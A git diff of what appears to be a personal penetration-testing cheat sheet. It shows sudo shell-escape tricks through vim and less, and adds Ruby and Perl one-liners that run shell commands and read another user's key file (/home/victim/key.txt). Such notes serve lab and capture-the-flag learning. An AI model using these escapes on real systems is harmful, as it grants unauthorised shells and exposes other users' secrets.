@@ -268,7 +268,13 @@ sudo -u victim vim 						# 1st - Open vim as the the privledged user
 sudo -u victim less /etc/passwd					# 1st - open an arbitry file with less
 At the less search icontype:  !/bin/bash			# 2nd - This will open a shell !!
 ```
+## Running Languages
+```
+/usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'		# ruby - run commands by putting them in backticks eg; `uname -a`
 
+perl -e 'print `cat /home/victim/key.txt`'			# notice to use single (hard) quotes around the back ticks for yuor cmd so they aget run at the right times.
+
+```
 
 # Text editing on Linux
 
